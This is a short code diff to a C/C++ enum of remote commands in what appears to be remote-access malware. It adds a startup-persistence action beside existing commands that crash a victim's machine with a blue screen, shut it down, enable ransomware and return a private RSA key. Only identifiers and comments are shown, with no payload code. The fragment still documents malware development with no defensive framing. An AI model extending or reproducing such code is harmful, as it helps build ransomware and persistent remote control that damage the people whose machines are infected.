@@ -35,6 +35,7 @@ enum RemoteAction {
     kPingClient,
     kKeepAlive,
     kRemoteBSOD, // cause a blue screen of death
+    kAddToStartup,
     kRemoteShutdown, // shut down the client machine
     kRansomwareEnable, // dangerous, enable ransomware on client machine
     kReturnPrivateRSAKey,
